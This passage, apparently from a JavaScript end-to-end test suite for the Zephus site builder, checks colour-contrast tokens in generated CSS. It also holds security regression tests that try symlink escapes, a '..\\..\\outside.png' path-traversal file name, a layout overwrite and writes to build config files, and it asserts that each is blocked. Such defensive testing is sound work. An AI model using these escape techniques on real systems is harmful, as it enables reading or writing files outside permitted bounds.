      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const cssPath = path.join(
          project,
          "public",
          "styles",
          "zephus-managed.css",
        );
        const css = fs.existsSync(cssPath)
          ? fs.readFileSync(cssPath, "utf8")
          : "";
        const requiredSelectors = [
          "--shadow-sm",
          "--shadow-md",
          ".section-box",
          ".button",
          ".lead",
          ".zephus-column",
          ".zephus-feature",
          ".zephus-testimonial",
          ".zephus-accordion",
          ".zephus-stats",
          ".zephus-pricing",
          ".zephus-cta",
          ".zephus-postlist",
          ".zephus-gallery",
          'iframe[data-zephus-block="embed"]',
        ];
        const missing = requiredSelectors.filter((sel) => !css.includes(sel));
        record(
          "managed stylesheet covers all block classes",
          missing.length === 0,
          missing.length === 0 ? "ok" : `missing: ${missing.join(", ")}`,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // A light custom accent must not leave white labels on buttons, the skip
  // link, the announcement, or the header call to action.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("light accent keeps button text readable", false, e.message);
      record("accent button hover keeps its label readable", false, e.message);
      record(
        "accent ink stays readable on the lifted header",
        false,
        e.message,
      );
      record(
        "muted text keeps a readable mix of the foreground",
        false,
        e.message,
      );
      record(
        "header text stays readable on the lifted surface",
        false,
        e.message,
      );
      record(
        "post list meta keeps a readable mix of the foreground",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      let readableRecorded = false;
      let hoverRecorded = false;
      let headerRecorded = false;
      let mutedRecorded = false;
      let headerTextRecorded = false;
      let metaRecorded = false;
      try {
        const channel = (value) => {
          const s = value / 255;
          return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4;
        };
        const luminance = (rgb) =>
          0.2126 * channel(rgb[0]) +
          0.7152 * channel(rgb[1]) +
          0.0722 * channel(rgb[2]);
        const ratio = (fg, bg) => {
          const hi = Math.max(luminance(fg), luminance(bg));
          const lo = Math.min(luminance(fg), luminance(bg));
          return (hi + 0.05) / (lo + 0.05);
        };
        const parse = (hex) => {
          const n = Number.parseInt(hex.slice(1), 16);
          return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
        };
        const cssPath = path.join(
          project,
          "public",
          "styles",
          "zephus-managed.css",
        );
        const siteRead = svc.schema.readSiteDocument(project);
        const site = siteRead.site;
        site.design.background = "#ffffff";
        site.design.surface = "#f8fafc";
        const cases = ["#fde047", "#ffffff", "rgb(253, 224, 71)", "#4f46e5"];
        const seen = [];
        const inkSeen = [];
        for (const accent of cases) {
          site.design.accent = accent;
          const written = svc.schema.writeSiteDocument(
            project,
            site,
            "src/pages",
          );
          const css = fs.readFileSync(cssPath, "utf8");
          const token = css.match(/--zephus-on-accent:\s*(#[0-9a-fA-F]{6})/);
          const fg = token ? token[1].toLowerCase() : "";
          const bg =
            accent === "rgb(253, 224, 71)" ? "#fde047" : accent.toLowerCase();
          const score = fg ? ratio(parse(fg), parse(bg)) : 0;
          const usesToken =
            css.includes("color: var(--zephus-on-accent);") &&
            css.includes("color: var(--zephus-on-accent) !important;");
          seen.push(
            `${accent}:${written.ok === true}:${fg}:${score.toFixed(2)}:${usesToken}`,
          );
          const inkToken = css.match(
            /--zephus-accent-ink:\s*(#[0-9a-fA-F]{6})/,
          );
          const ink = inkToken ? inkToken[1].toLowerCase() : "";
          const onPaper = ink ? ratio(parse(ink), parse("#ffffff")) : 0;
          const onCard = ink ? ratio(parse(ink), parse("#f8fafc")) : 0;
          inkSeen.push(
            `${accent}=${ink}@${onPaper.toFixed(2)}/${onCard.toFixed(2)}:${css.includes("color: var(--zephus-accent-ink);")}`,
          );
        }
        site.design.background = "#0f172a";
        site.design.surface = "#111827";
        site.design.accent = "#1e1b4b";
        const darkWrite = svc.schema.writeSiteDocument(
          project,
          site,
          "src/pages",
        );
        const darkCss = fs.readFileSync(cssPath, "utf8");
        const darkToken = darkCss.match(
          /--zephus-accent-ink:\s*(#[0-9a-fA-F]{6})/,
        );
        const darkInk = darkToken ? darkToken[1].toLowerCase() : "";
        const onNight = darkInk ? ratio(parse(darkInk), parse("#0f172a")) : 0;
        const onNightCard = darkInk
          ? ratio(parse(darkInk), parse("#111827"))
          : 0;
        inkSeen.push(
          `dark=${darkWrite.ok === true}:${darkInk}@${onNight.toFixed(2)}/${onNightCard.toFixed(2)}`,
        );
        const styles = fs.readFileSync(
          path.join(ROOT, "src", "renderer", "styles.css"),
          "utf8",
        );
        const themes = fs.readFileSync(
          path.join(ROOT, "src", "main", "themes.ts"),
          "utf8",
        );
        const engine = fs.readFileSync(
          path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
          "utf8",
        );
        const light = seen[0];
        const paper = seen[1];
        const rgb = seen[2];
        const brand = seen[3];
        const inkPasses = (entry) => {
          const scores = String(entry ?? "").split("@")[1] ?? "";
          const [onPaper, rest] = scores.split("/");
          return (
            Number(onPaper) >= 4.5 &&
            Number((rest ?? "").split(":")[0]) >= 4.5 &&
            String(entry ?? "").endsWith(":true")
          );
        };
        const darkScores = String(inkSeen[4] ?? "").split("@")[1] ?? "";
        const ok =
          light.startsWith("#fde047:true:#11131a:") &&
          Number(light.split(":")[3]) >= 4.5 &&
          light.endsWith(":true") &&
          paper.startsWith("#ffffff:true:#11131a:") &&
          rgb.startsWith("rgb(253, 224, 71):true:#11131a:") &&
          brand.startsWith("#4f46e5:true:#ffffff:") &&
          Number(brand.split(":")[3]) >= 4.5 &&
          String(inkSeen[3] ?? "").startsWith("#4f46e5=#4f46e5@") &&
          inkPasses(inkSeen[0]) &&
          inkPasses(inkSeen[1]) &&
          inkPasses(inkSeen[2]) &&
          inkPasses(inkSeen[3]) &&
          String(inkSeen[4] ?? "").startsWith("dark=true:") &&
          Number(darkScores.split("/")[0]) >= 4.5 &&
          Number(darkScores.split("/")[1]) >= 4.5 &&
          styles.includes(
            "color: var(--zephus-accent-ink, var(--zephus-accent, var(--accent)));",
          ) &&
          themes.includes("color: var(--zephus-accent-ink, var(--accent));") &&
          engine.includes(
            "accentInk(design?.accent, design?.background, design?.surface)",
          ) &&
          styles.includes("color: var(--zephus-on-accent, #ffffff);") &&
          themes.includes("color: var(--zephus-on-accent, #ffffff);") &&
          engine.includes(
            '["--zephus-on-accent", onAccentText(design?.accent)]',
          );
        record(
          "light accent keeps button text readable",
          Boolean(ok),
          `${seen.join(" | ")} || ${inkSeen.join(" | ")}`,
        );
        readableRecorded = true;

        const mixChannels = (base, toward) =>
          base.map((channel, index) =>
            Math.round(channel * 0.86 + toward[index] * 0.14),
          );
        site.design.background = "#ffffff";
        site.design.surface = "#f8fafc";
        const hoverSeen = [];
        for (const accent of ["#f00091", "#4f46e5"]) {
          site.design.accent = accent;
          const written = svc.schema.writeSiteDocument(
            project,
            site,
            "src/pages",
          );
          const css = fs.readFileSync(cssPath, "utf8");
          const label =
            css
              .match(/--zephus-on-accent:\s*(#[0-9a-fA-F]{6})/)?.[1]
              ?.toLowerCase() ?? "";
          const mix =
            css
              .match(/--zephus-accent-hover-mix:\s*(#[0-9a-fA-F]{6})/)?.[1]
              ?.toLowerCase() ?? "";
          const hoverBg =
            label && mix ? mixChannels(parse(accent), parse(mix)) : null;
          const score = hoverBg ? ratio(parse(label), hoverBg) : 0;
          hoverSeen.push(
            `${accent}:${written.ok === true}:${label}:${mix}:${score.toFixed(2)}:${css.includes("var(--zephus-accent-hover-mix)")}`,
          );
        }
        const vivid = hoverSeen[0] ?? "";
        const indigo = hoverSeen[1] ?? "";
        record(
          "accent button hover keeps its label readable",
          vivid.startsWith("#f00091:true:#11131a:#ffffff:") &&
            Number(vivid.split(":")[4]) >= 4.5 &&
            vivid.endsWith(":true") &&
            indigo.startsWith("#4f46e5:true:#ffffff:#000000:") &&
            Number(indigo.split(":")[4]) >= 4.5 &&
            styles.includes("var(--zephus-accent-hover-mix, #000)") &&
            themes.includes("var(--zephus-accent-hover-mix, #000)") &&
            engine.includes("accentHoverMix(design?.accent)"),
          hoverSeen.join(" | "),
        );
        hoverRecorded = true;

        const lift = (color) =>
          color.map((channel) => Math.round(channel + (255 - channel) * 0.08));
        site.design.background = "#111827";
        site.design.surface = "#111827";
        site.design.accent = "#000008";
        const headerWrite = svc.schema.writeSiteDocument(
          project,
          site,
          "src/pages",
        );
        const headerCss = fs.readFileSync(cssPath, "utf8");
        const headerInk =
          headerCss
            .match(/--zephus-accent-ink:\s*(#[0-9a-fA-F]{6})/)?.[1]
            ?.toLowerCase() ?? "";
        const headerPlane = lift(parse("#111827"));
        const headerScore = headerInk
          ? ratio(parse(headerInk), headerPlane)
          : 0;
        const surfaceScore = headerInk
          ? ratio(parse(headerInk), parse("#111827"))
          : 0;
        const schema = fs.readFileSync(
          path.join(ROOT, "src", "main", "services", "schema.ts"),
          "utf8",
        );
        record(
          "accent ink stays readable on the lifted header",
          headerWrite.ok === true &&
            headerScore >= 4.5 &&
            surfaceScore >= 4.5 &&
            schema.includes(
              "color-mix(in srgb, var(--zephus-surface) 92%, white 8%)",
            ),
          `${headerInk} header=${headerScore.toFixed(2)} surface=${surfaceScore.toFixed(2)}`,
        );
        headerRecorded = true;

        const composite = (ink, plane, percent) =>
          ink.map((channel, index) =>
            Math.round(
              channel + (plane[index] - channel) * (1 - percent / 100),
            ),
          );
        const readMix = (css, name) => {
          const match = css.match(
            new RegExp(`--zephus-${name}-mix:\\s*(\\d+)%`),
          );
          return match ? Number(match[1]) : 0;
        };
        const mutedScore = (css, name, plane) => {
          const percent = readMix(css, name);
          const ink = parse(site.design.foreground);
          return {
            percent,
            onPlane: percent ? ratio(composite(ink, plane, percent), plane) : 0,
          };
        };
        site.design.background = "#ffffff";
        site.design.surface = "#f8fafc";
        site.design.foreground = "#0f172a";
        const strongWrite = svc.schema.writeSiteDocument(
          project,
          site,
          "src/pages",
        );
        const strongCss = fs.readFileSync(cssPath, "utf8");
        site.design.foreground = "#475569";
        const slateWrite = svc.schema.writeSiteDocument(
          project,
          site,
          "src/pages",
        );
        const slateCss = fs.readFileSync(cssPath, "utf8");
        const white = parse("#ffffff");
        const card = parse("#f8fafc");
        const slateLead = mutedScore(slateCss, "lead", white);
        const slateCaption = mutedScore(slateCss, "caption", card);
        record(
          "muted text keeps a readable mix of the foreground",
          strongWrite.ok === true &&
            readMix(strongCss, "lead") === 68 &&
            readMix(strongCss, "caption") === 65 &&
            slateWrite.ok === true &&
            slateLead.percent > 68 &&
            slateCaption.percent > 65 &&
            slateLead.onPlane >= 4.5 &&
            slateCaption.onPlane >= 4.5 &&
            mutedScore(slateCss, "lead", card).onPlane >= 4.5 &&
            mutedScore(slateCss, "caption", white).onPlane >= 4.5 &&
            schema.includes("var(--zephus-lead-mix)") &&
            schema.includes("var(--zephus-caption-mix)") &&
            themes.includes("var(--zephus-lead-mix, 68%)") &&
            styles.includes("var(--zephus-lead-mix, 68%)") &&
            engine.includes(
              "mutedForegroundPercent(design?.foreground, design?.background, design?.surface, 68)",
            ),
          `strong=${readMix(strongCss, "lead")}/${readMix(strongCss, "caption")} slate=${slateLead.percent}@${slateLead.onPlane.toFixed(2)}/${slateCaption.percent}@${slateCaption.onPlane.toFixed(2)}`,
        );
        mutedRecorded = true;

        const readToken = (css, name) =>
          css
            .match(new RegExp(`--zephus-${name}:\\s*(#[0-9a-fA-F]{6})`))?.[1]
            ?.toLowerCase() ?? "";
        site.design.background = "#ffffff";
        site.design.surface = "#f8fafc";
        site.design.foreground = "#0f172a";
        const plainWrite = svc.schema.writeSiteDocument(
          project,
          site,
          "src/pages",
        );
        const plainCss = fs.readFileSync(cssPath, "utf8");
        site.design.background = "#111827";
        site.design.surface = "#111827";
        site.design.foreground = "#818181";
        const edgeWrite = svc.schema.writeSiteDocument(
          project,
          site,
          "src/pages",
        );
        const edgeCss = fs.readFileSync(cssPath, "utf8");
        const edgeHeader = readToken(edgeCss, "header-text");
        const edgeForeground = readToken(edgeCss, "foreground");
        const liftedHeader = lift(parse("#111827"));
        const edgeOnHeader = edgeHeader
          ? ratio(parse(edgeHeader), liftedHeader)
          : 0;
        const originalOnSurface = ratio(parse("#818181"), parse("#111827"));
        const originalOnHeader = ratio(parse("#818181"), liftedHeader);
        const logoUsesHeader =
          /\.zephus-shell-logo\s*\{[^}]*color:\s*var\(--zephus-header-text\)/.test(
            schema,
          );
        const navUsesHeader =
          /\.zephus-shell-nav a:where\(:not\(\.button\)\)\s*\{[^}]*color:\s*var\(--zephus-header-text\)/.test(
            schema,
          );
        record(
          "header text stays readable on the lifted surface",
          plainWrite.ok === true &&
            readToken(plainCss, "header-text") === "#0f172a" &&
            edgeWrite.ok === true &&
            originalOnSurface >= 4.5 &&
            originalOnHeader < 4.5 &&
            edgeForeground === "#818181" &&
            edgeHeader !== "#818181" &&
            edgeOnHeader >= 4.5 &&
            logoUsesHeader &&
            navUsesHeader &&
            engine.includes("headerText(design?.foreground, design?.surface)"),
          `plain=${readToken(plainCss, "header-text")} edge=${edgeForeground}->${edgeHeader} header=${edgeOnHeader.toFixed(2)} surface=${originalOnSurface.toFixed(2)}`,
        );
        headerTextRecorded = true;

        const blockRule = (css, selector) => {
          const escaped = selector.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
          return css.match(new RegExp(escaped + "\\s*\\{[^}]*\\}"))?.[0] ?? "";
        };
        const readableMeta = (rule) =>
          rule.includes("--zephus-meta-mix") &&
          /opacity:\s*1/.test(rule) &&
          !/0\.72/.test(rule);
        const canvasMeta = (rule) =>
          rule.includes("--zephus-meta-mix") &&
          rule.includes("72%") &&
          !/0\.72/.test(rule);
        site.design.background = "#ffffff";
        site.design.surface = "#f8fafc";
        site.design.foreground = "#0f172a";
        const metaPlainWrite = svc.schema.writeSiteDocument(
          project,
          site,
          "src/pages",
        );
        const metaPlainCss = fs.readFileSync(cssPath, "utf8");
        site.design.foreground = "#475569";
        const metaSlateWrite = svc.schema.writeSiteDocument(
          project,
          site,
          "src/pages",
        );
        const metaSlateCss = fs.readFileSync(cssPath, "utf8");
        const metaSlate = mutedScore(metaSlateCss, "meta", white);
        const metaRule = blockRule(metaSlateCss, ".zephus-postlist-meta");
        const emptyRule = blockRule(metaSlateCss, ".zephus-postlist-empty");
        record(
          "post list meta keeps a readable mix of the foreground",
          metaPlainWrite.ok === true &&
            readMix(metaPlainCss, "meta") === 72 &&
            metaSlateWrite.ok === true &&
            metaSlate.percent > 72 &&
            metaSlate.onPlane >= 4.5 &&
            mutedScore(metaSlateCss, "meta", card).onPlane >= 4.5 &&
            readableMeta(metaRule) &&
            readableMeta(emptyRule) &&
            readableMeta(blockRule(themes, ".zephus-postlist-meta")) &&
            readableMeta(blockRule(themes, ".zephus-postlist-empty")) &&
            canvasMeta(blockRule(styles, ".canvas .zephus-postlist-meta")) &&
            canvasMeta(blockRule(styles, ".canvas .zephus-postlist-empty")) &&
            themes.includes("var(--zephus-meta-mix, 72%)") &&
            engine.includes(
              "mutedForegroundPercent(design?.foreground, design?.background, design?.surface, 72)",
            ),
          `plain=${readMix(metaPlainCss, "meta")} slate=${metaSlate.percent}@${metaSlate.onPlane.toFixed(2)}`,
        );
        metaRecorded = true;
      } catch (e) {
        if (!readableRecorded) {
          record("light accent keeps button text readable", false, e.message);
        }
        if (!hoverRecorded) {
          record(
            "accent button hover keeps its label readable",
            false,
            e.message,
          );
        }
        if (!headerRecorded) {
          record(
            "accent ink stays readable on the lifted header",
            false,
            e.message,
          );
        }
        if (!mutedRecorded) {
          record(
            "muted text keeps a readable mix of the foreground",
            false,
            e.message,
          );
        }
        if (!headerTextRecorded) {
          record(
            "header text stays readable on the lifted surface",
            false,
            e.message,
          );
        }
        if (!metaRecorded) {
          record(
            "post list meta keeps a readable mix of the foreground",
            false,
            e.message,
          );
        }
      } finally {
        rm(tmp);
      }
    }
  }

  // 7. Dangling symlink escape blocked in assertRealpathInside & duplicatePage.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record(
        "dangling symlink escape blocked in assertRealpathInside",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const fsSafe = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "fsSafe.js"),
          ).href
        );
        const outsideTarget = path.join(tmp, "outside-target.astro");
        const linkPath = path.join(project, "src", "pages", "escape.astro");
        fs.symlinkSync(outsideTarget, linkPath);
        let threw = false;
        try {
          fsSafe.assertRealpathInside(project, linkPath);
        } catch {
          threw = true;
        }
        const dup = svc.pageManager.duplicatePage(
          project,
          "src/pages/index.astro",
          "src/pages",
          "escape",
        );
        const createdOutside = fs.existsSync(outsideTarget);
        record(
          "dangling symlink escape blocked in assertRealpathInside",
          threw && dup.ok === false && !createdOutside,
          `threw=${threw} dupOk=${dup.ok} createdOutside=${createdOutside}`,
        );
      } catch (e) {
        record(
          "dangling symlink escape blocked in assertRealpathInside",
          false,
          e.message,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 8. Repo settings symlink containment blocks external reads and .corrupt backups.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("repo settings symlink containment", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const settingsSvc = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "settings.js"),
          ).href
        );
        const secretFile = path.join(tmp, "outside-secret.txt");
        fs.writeFileSync(secretFile, "PRIVATE=1\n", "utf8");
        const settingsPath = path.join(project, ".zephus", "settings.json");
        fs.rmSync(settingsPath, { force: true });
        fs.symlinkSync(secretFile, settingsPath);
        const loaded = settingsSvc.readRepoSettings(project);
        const hasCorruptBackup = fs
          .readdirSync(path.join(project, ".zephus"))
          .some((name) => name.includes(".corrupt-"));
        record(
          "repo settings symlink containment",
          loaded.schemaVersion === 1 && !hasCorruptBackup,
          `schemaVersion=${loaded.schemaVersion} hasCorrupt=${hasCorruptBackup}`,
        );
      } catch (e) {
        record("repo settings symlink containment", false, e.message);
      } finally {
        rm(tmp);
      }
    }
  }

  // 9. detachPageDocument pins pagesDir and blocks layout overwrite.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record(
        "detachPageDocument pins pagesDir and blocks layout overwrite",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const layoutPath = path.join(
          project,
          "src",
          "layouts",
          "BaseLayout.astro",
        );
        const before = fs.readFileSync(layoutPath, "utf8");
        const res = svc.schema.detachPageDocument(
          project,
          "src/layouts/BaseLayout.astro",
          "src/layouts",
          "<p>pwned</p>",
        );
        const after = fs.readFileSync(layoutPath, "utf8");
        record(
          "detachPageDocument pins pagesDir and blocks layout overwrite",
          res.ok === false && after === before,
          `ok=${res.ok} unchanged=${after === before}`,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 10. writeProjectFile blocks vite, postcss, and tailwind config execution.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record(
        "writeProjectFile blocks vite/postcss/tailwind configs",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const filesSvc = await import(
          pathToFileURL(path.join(ROOT, "dist", "main", "services", "files.js"))
            .href
        );
        const targets = [
          "vite.config.mjs",
          "postcss.config.js",
          "tailwind.config.ts",
        ];
        const results = targets.map((cfg) => ({
          cfg,
          res: filesSvc.writeProjectFile(project, cfg, "export default {};"),
        }));
        const allBlocked = results.every((r) => r.res.ok === false);
        record(
          "writeProjectFile blocks vite/postcss/tailwind configs",
          allBlocked,
          results.map((r) => `${r.cfg}:${r.res.ok}`).join(", "),
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 11. reattachPageDocument recovers out-of-sync page.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record(
        "reattachPageDocument recovers out-of-sync page",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const pageRel = "src/pages/index.astro";
        const pageFile = path.join(project, pageRel);
        const updated = fs
          .readFileSync(pageFile, "utf8")
          .replace("</BaseLayout>", "  <p>Hand edit</p>\n</BaseLayout>");
        fs.writeFileSync(pageFile, updated, "utf8");
        const before = svc.schema.readPageDocument(
          project,
          pageRel,
          "src/pages",
        );
        const reattached = svc.schema.reattachPageDocument(
          project,
          pageRel,
          "src/pages",
        );
        const pass =
          before.pageDocument?.managedFileStatus === "out-of-sync" &&
          reattached.ok === true &&
          reattached.pageDocument?.managedFileStatus === "managed";
        record(
          "reattachPageDocument recovers out-of-sync page",
          pass,
          `before=${before.pageDocument?.managedFileStatus} after=${reattached.pageDocument?.managedFileStatus}`,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 12. renamePage blocks home page and syncs detached page nav.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record(
        "renamePage blocks home page and syncs detached page nav",
        false,
        e.message,
      );
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const homeRes = svc.pageManager.renamePage(
          project,
          "src/pages/index.astro",
          "src/pages",
          "home-renamed",
        );
        svc.schema.createSchemaPage(project, "src/pages", "team");
        svc.schema.detachPageDocument(
          project,
          "src/pages/team.astro",
          "src/pages",
          "---\nimport BaseLayout from '../layouts/BaseLayout.astro';\n---\n<BaseLayout><p>Team</p></BaseLayout>\n",
        );
        const teamRes = svc.pageManager.renamePage(
          project,
          "src/pages/team.astro",
          "src/pages",
          "our-team",
        );
        const siteDoc = svc.schema.readSiteDocument(project, "src/pages");
        const hasUpdatedNav = !!siteDoc.site?.shell?.navItems?.some(
          (item) => item.href === "/our-team",
        );
        record(
          "renamePage blocks home page and syncs detached page nav",
          homeRes.ok === false && teamRes.ok === true && hasUpdatedNav,
          `homeOk=${homeRes.ok} teamOk=${teamRes.ok} nav=${hasUpdatedNav}`,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 13. Bare domain siteUrl generates discovery files.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("bare domain siteUrl generates discovery files", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const siteRes = svc.schema.readSiteDocument(project, "src/pages");
        const written = svc.schema.writeSiteDocument(
          project,
          { ...siteRes.site, siteUrl: "example.com" },
          "src/pages",
        );
        const sitemapPath = path.join(project, "public", "sitemap.xml");
        const robotsPath = path.join(project, "public", "robots.txt");
        const sitemap = fs.existsSync(sitemapPath)
          ? fs.readFileSync(sitemapPath, "utf8")
          : "";
        const robots = fs.existsSync(robotsPath)
          ? fs.readFileSync(robotsPath, "utf8")
          : "";
        record(
          "bare domain siteUrl generates discovery files",
          written.ok &&
            sitemap.includes("https://example.com/") &&
            robots.includes("https://example.com/sitemap.xml"),
          `sitemap=${sitemap.includes("https://example.com/")} robots=${robots.includes("https://example.com/sitemap.xml")}`,
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // 14. Postlist canvas image hydration and noindex exclusion.
  {
    const html = blockRender.renderBlockHtml(
      {
        id: "pl-img",
        type: "postlist",
        props: { title: "News", folder: "/blog", showImage: "true" },
      },
      {
        viewport: "desktop",
        forCanvas: true,
        maxHeadingLevel: 6,
        posts: [
          {
            route: "/blog/p1",
            title: "Post 1",
            description: "",
            date: "2026-01-01",
            author: "Alice",
            image: "/assets/images/hero.jpg",
          },
        ],
      },
    );
    const built = svc.schema.buildPostIndex([
      {
        page: "src/pages/blog/p1.astro",
        route: "/blog/p1",
        slug: "blog/p1",
        title: "P1",
        navLabel: "P1",
        metaDescription: "",
        navVisible: true,
        isHome: false,
        detached: false,
        socialImage: "/assets/images/hero.jpg",
        canonicalUrl: "",
        noindex: false,
        publishDate: "2026-01-01",
        author: "Alice",
      },
      {
        page: "src/pages/blog/hidden.astro",
        route: "/blog/hidden",
        slug: "blog/hidden",
        title: "Hidden",
        navLabel: "Hidden",
        metaDescription: "",
        navVisible: false,
        isHome: false,
        detached: false,
        socialImage: "",
        canonicalUrl: "",
        noindex: true,
        publishDate: "2026-01-02",
        author: "Alice",
      },
    ]);
    const hasPlaceholder =
      html.includes(`src="${blockRender.CANVAS_ASSET_PLACEHOLDER_SRC}"`) &&
      html.includes('data-asset-src="/assets/images/hero.jpg"');
    const excludesNoindex = built.length === 1 && built[0].route === "/blog/p1";
    record(
      "postlist canvas image hydration and noindex exclusion",
      hasPlaceholder && excludesNoindex,
      `placeholder=${hasPlaceholder} builtLen=${built.length}`,
    );
  }

  // 15. Blockquote without <p> and legacy section style parity.
  {
    let uid = 0;
    const parser = editorParse.createEditorPageParser({
      uid: () => `e2e-p-${++uid}`,
      createFallbackSection: () => ({
        id: `e2e-p-${++uid}`,
        type: "section",
        label: "Main",
        props: { wrapper: "none", cls: "" },
        children: [],
      }),
      knownBlockTypes: editorBlocks.KNOWN_BLOCK_TYPES,
    });
    const src =
      '---\nimport BaseLayout from "../layouts/BaseLayout.astro";\n---\n<BaseLayout>\n' +
      '<section style="padding: 40px 20px; background: #ff0000">\n' +
      "<blockquote>Direct quote<cite>Author</cite></blockquote>\n" +
      "</section>\n</BaseLayout>\n";
    const mainSec = svc.schema.parseSectionsFromSource(src)[0];
    const { inner } = editorSerialize.splitManagedPageSource(src);
    const editorSec = parser.parseSections(inner)[0];
    const mainOk =
      mainSec?.style?.padding === "40px 20px" &&
      mainSec?.style?.background === "#ff0000" &&
      mainSec?.children?.[0]?.props?.text === "Direct quote" &&
      mainSec?.children?.[0]?.props?.cite === "Author";
    const editorOk =
      editorSec?.style?.padding === "40px 20px" &&
      editorSec?.style?.background === "#ff0000" &&
      editorSec?.children?.[0]?.props?.text === "Direct quote" &&
      editorSec?.children?.[0]?.props?.cite === "Author";
    record(
      "blockquote without p and legacy section style parity",
      Boolean(mainOk && editorOk),
      `mainOk=${Boolean(mainOk)} editorOk=${Boolean(editorOk)}`,
    );
  }

  // 16. renameAsset preserves dotted version stems.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("renameAsset preserves dotted version stems", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const assetsSvc = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "assets.js"),
          ).href
        );
        const png1x1 = Buffer.from(
          "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
          "base64",
        );
        const srcImg = path.join(tmp, "hero.png");
        fs.writeFileSync(srcImg, png1x1);
        const imported = assetsSvc.importAssetsFromPaths(project, "public", [
          srcImg,
        ]);
        const webPath = imported.imported?.[0]?.webPath;
        const renamed = assetsSvc.renameAsset(
          project,
          "public",
          webPath,
          "release-v1.2",
        );
        record(
          "renameAsset preserves dotted version stems",
          renamed.ok === true &&
            renamed.webPath === "/assets/images/release-v1.2.png",
          renamed.ok ? renamed.webPath : (renamed.error ?? "failed"),
        );
      } finally {
        rm(tmp);
      }
    }
  }

  // Dropped files have no filesystem path in the webview. The bytes must land
  // in public/assets and a directory prefix in the name must not escape.
  {
    let ctx;
    try {
      ctx = mkSite(svc, "minimal");
    } catch (e) {
      record("dropped asset bytes stay inside public", false, e.message);
      ctx = null;
    }
    if (ctx) {
      const { tmp, project } = ctx;
      try {
        const assetsSvc = await import(
          pathToFileURL(
            path.join(ROOT, "dist", "main", "services", "assets.js"),
          ).href
        );
        const png =
          "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
        const dropped = assetsSvc.importAssetBytes(
          project,
          "public",
          "notes.png",
          png,
        );
        const escaped = assetsSvc.importAssetBytes(
          project,
          "public",
          "..\\..\\outside.png",
          png,
        );
        const rejected = assetsSvc.importAssetBytes(
          project,
          "public",
          "note.exe",
          png,
        );
        const tooBig = assetsSvc.importAssetBytes(
          project,
          "public",
          "huge.png",
          "A".repeat(Math.ceil((16 * 1024 * 1024) / 3) * 4 + 8),
        );
        const stored = path.join(
          project,
          "public",
          "assets",
          "images",
          "notes.png",
        );
        const escapedFile = path.join(
          project,
          "public",
          "assets",
          "images",
          "outside.png",
        );
        const preload = fs.readFileSync(
          path.join(ROOT, "src", "renderer", "tauriPreload.ts"),
          "utf8",
        );
        const electronPreload = fs.readFileSync(
          path.join(ROOT, "src", "main", "preload.ts"),
          "utf8",
        );
        const wired =
          /importAssetPaths:\s*async/.test(preload) &&
          preload.includes("IPC.importAssetBytes") &&
          preload.includes("arrayBuffer") &&
          electronPreload.includes("getPathForFile");
        const outsideProject = path.join(project, "outside.png");
        const outsideTmp = path.join(tmp, "outside.png");
        record(
          "dropped asset bytes stay inside public",
          dropped.ok === true &&
            dropped.imported?.[0]?.webPath === "/assets/images/notes.png" &&
            fs.existsSync(stored) &&
            fs.readFileSync(stored).equals(Buffer.from(png, "base64")) &&
            escaped.ok === true &&
            escaped.imported?.[0]?.webPath === "/assets/images/outside.png" &&
            fs.existsSync(escapedFile) &&
            !fs.existsSync(outsideProject) &&
            !fs.existsSync(outsideTmp) &&
            rejected.ok === false &&
            !fs.existsSync(path.join(project, "public", "note.exe")) &&
            tooBig.ok === false &&
            !fs.existsSync(
              path.join(project, "public", "assets", "images", "huge.png"),
            ) &&
            wired,
          dropped.ok
            ? `escaped=${escaped.imported?.[0]?.webPath ?? escaped.errors?.[0]} rejected=${rejected.errors?.[0] ?? "ok"} wired=${wired}`
            : (dropped.errors?.[0] ?? "failed"),
        );
      } finally {
